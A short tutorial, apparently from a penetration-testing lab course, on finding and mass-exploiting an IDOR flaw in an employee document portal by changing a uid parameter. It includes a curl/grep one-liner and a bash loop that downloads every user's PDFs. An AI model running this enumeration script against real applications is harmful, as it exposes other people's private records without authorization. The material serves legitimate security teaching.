# Mass IDOR Enumeration

Exploiting IDOR vulnerabilities ranges from simple to highly challenging. Once identified, basic techniques can test exposure, but advanced attacks require understanding the application's object reference calculations and access control mechanisms.

## Insecure Parameters

### Basic Example: Employee Manager

Consider an Employee Manager application at `http://SERVER_IP:PORT/` with employee records. When logged in as user `uid=1` and navigating to Documents:

```
http://SERVER_IP:PORT/documents.php?uid=1
```

Documents contain predictable file names:
```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

### Vulnerable Parameter Exposure

The `uid` GET parameter directly controls which employee records display. Changing it to `?uid=2` reveals different documents:

```
http://SERVER_IP:PORT/documents.php?uid=2
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

This common IDOR flaw lacks proper access control validation on the back-end, allowing arbitrary access by manipulating the parameter.

## Mass Enumeration Technique

Manual enumeration across hundreds of employees is inefficient. Instead, use automated approaches with Burp Intruder, ZAP Fuzzer, or scripting.

### Extract Document Links

Using Firefox inspector (CTRL+SHIFT+C), examine the HTML structure:

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

Extract links with grep and regex:

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Output:
```
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_06_2020.pdf
```

### Automated Download Script

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q "$url/$link"
    done
done
```

This script downloads all documents for users 1-10, successfully exploiting the IDOR vulnerability through mass enumeration.
